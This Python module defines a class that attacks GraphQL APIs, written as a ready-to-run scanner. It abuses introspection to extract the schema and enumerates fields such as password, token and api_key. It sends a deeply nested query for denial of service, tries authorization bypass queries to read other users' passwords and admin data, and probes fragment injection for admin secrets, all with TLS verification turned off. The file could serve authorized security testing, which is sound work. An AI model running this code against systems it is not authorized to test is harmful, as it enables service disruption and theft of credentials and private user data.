"""
GraphQL API Attacks Module
- Introspection abuse
- Query complexity DoS
- Authorization bypass
- Field enumeration
"""

import requests
import json
from typing import Dict, Any
import logging

logger = logging.getLogger(__name__)

class GraphQLAttackAnalyzer:
    """Analyze GraphQL API vulnerabilities"""
    
    def __init__(self, base_url: str, endpoint: str = '/graphql', token: str = None):
        self.base_url = base_url.rstrip('/')
        self.endpoint = endpoint
        self.token = token
        self.headers = {'Authorization': f'Bearer {token}'} if token else {}
        self.headers['Content-Type'] = 'application/json'
        self.graphql_url = f"{self.base_url}{endpoint}"
        
    def test_introspection(self) -> Dict[str, Any]:
        """Test GraphQL introspection for schema extraction"""
        logger.info("[*] Testing GraphQL introspection...")
        
        introspection_query = """
        query {
            __schema {
                types {
                    name
                    fields {
                        name
                        type {
                            name
                        }
                    }
                }
            }
        }
        """
        
        try:
            resp = requests.post(
                self.graphql_url,
                json={'query': introspection_query},
                headers=self.headers,
                timeout=5,
                verify=False
            )
            
            if resp.status_code == 200:
                data = resp.json()
                if 'data' in data and '__schema' in data['data']:
                    types = data['data']['__schema']['types']
                    logger.info(f"[+] Introspection successful! Found {len(types)} types")
                    return {
                        'vulnerable': True,
                        'technique': 'Introspection Enabled',
                        'types_count': len(types),
                        'types': [t['name'] for t in types[:10]]
                    }
        except Exception as e:
            logger.error(f"[-] Introspection test failed: {e}")
        
        return {'vulnerable': False}
    
    def extract_fields(self) -> Dict[str, Any]:
        """Extract all available fields from GraphQL schema"""
        logger.info("[*] Extracting GraphQL fields...")
        
        query = """
        query {
            __schema {
                queryType {
                    fields {
                        name
                        type {
                            name
                            kind
                        }
                        args {
                            name
                            type {
                                name
                            }
                        }
                    }
                }
            }
        }
        """
        
        try:
            resp = requests.post(
                self.graphql_url,
                json={'query': query},
                headers=self.headers,
                timeout=5,
                verify=False
            )
            
            if resp.status_code == 200:
                data = resp.json()
                fields = data['data']['__schema']['queryType']['fields']
                logger.info(f"[+] Extracted {len(fields)} query fields")
                return {
                    'fields': [f['name'] for f in fields],
                    'count': len(fields)
                }
        except:
            pass
        
        return {}
    
    def test_query_complexity_dos(self) -> Dict[str, Any]:
        """Test GraphQL query complexity DoS"""
        logger.info("[*] Testing GraphQL query complexity DoS...")
        
        # Deep nested query
        deep_query = """
        query {
            user {
                posts {
                    comments {
                        author {
                            posts {
                                comments {
                                    author {
                                        posts {
                                            comments {
                                                author {
                                                    id
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        """
        
        try:
            import time
            start = time.time()
            resp = requests.post(
                self.graphql_url,
                json={'query': deep_query},
                headers=self.headers,
                timeout=10,
                verify=False
            )
            elapsed = time.time() - start
            
            if resp.status_code == 200 and elapsed > 5:
                logger.info(f"[+] Complex query caused high latency: {elapsed}s")
                return {
                    'vulnerable': True,
                    'technique': 'Query Complexity DoS',
                    'response_time': elapsed
                }
        except:
            pass
        
        return {'vulnerable': False}
    
    def test_authorization_bypass(self) -> Dict[str, Any]:
        """Test authorization bypass in GraphQL queries"""
        logger.info("[*] Testing GraphQL authorization bypass...")
        
        queries = [
            # Try accessing admin data
            'query { admin { users { id name email } } }',
            # Try accessing private fields
            'query { user { password email } }',
            # Try accessing other user's data
            'query { user(id: 999) { email password } }'
        ]
        
        for query in queries:
            try:
                resp = requests.post(
                    self.graphql_url,
                    json={'query': query},
                    headers=self.headers,
                    timeout=5,
                    verify=False
                )
                
                if resp.status_code == 200:
                    data = resp.json()
                    if 'data' in data and data['data'] and 'error' not in data:
                        logger.info(f"[+] Unauthorized access: {query[:50]}")
                        return {
                            'vulnerable': True,
                            'technique': 'Authorization Bypass',
                            'query': query,
                            'response': str(data)[:200]
                        }
            except:
                pass
        
        return {'vulnerable': False}
    
    def test_field_enumeration(self) -> Dict[str, Any]:
        """Test GraphQL field enumeration"""
        logger.info("[*] Testing field enumeration...")
        
        common_fields = [
            'id', 'name', 'email', 'password', 'secret',
            'token', 'api_key', 'admin', 'role', 'permission'
        ]
        
        base_query = 'query { user { %s } }'
        enumerated_fields = []
        
        for field in common_fields:
            try:
                query = base_query % field
                resp = requests.post(
                    self.graphql_url,
                    json={'query': query},
                    headers=self.headers,
                    timeout=5,
                    verify=False
                )
                
                data = resp.json()
                if 'data' in data and field in str(data):
                    enumerated_fields.append(field)
                    logger.info(f"[+] Field found: {field}")
            except:
                pass
        
        return {
            'enumerated_fields': enumerated_fields,
            'sensitive_fields': [f for f in enumerated_fields if f in ['password', 'token', 'api_key']]
        }
    
    def test_fragment_injection(self) -> Dict[str, Any]:
        """Test GraphQL fragment injection"""
        logger.info("[*] Testing fragment injection...")
        
        fragment_query = """
        query {
            user {
                ... on Admin {
                    secret
                    admin_token
                }
            }
        }
        """
        
        try:
            resp = requests.post(
                self.graphql_url,
                json={'query': fragment_query},
                headers=self.headers,
                timeout=5,
                verify=False
            )
            
            if resp.status_code == 200 and 'secret' in resp.text:
                logger.info(f"[+] Fragment injection successful")
                return {
                    'vulnerable': True,
                    'technique': 'Fragment Injection',
                    'response': resp.text[:200]
                }
        except:
            pass
        
        return {'vulnerable': False}
    
    def analyze(self) -> Dict[str, Any]:
        """Run full GraphQL attack analysis"""
        logger.info("[*] Starting GraphQL attack analysis...")
        
        results = {
            'introspection': self.test_introspection(),
            'field_enumeration': self.test_field_enumeration(),
            'query_complexity_dos': self.test_query_complexity_dos(),
            'authorization_bypass': self.test_authorization_bypass(),
            'fragment_injection': self.test_fragment_injection(),
            'extracted_fields': self.extract_fields()
        }
        
        return results
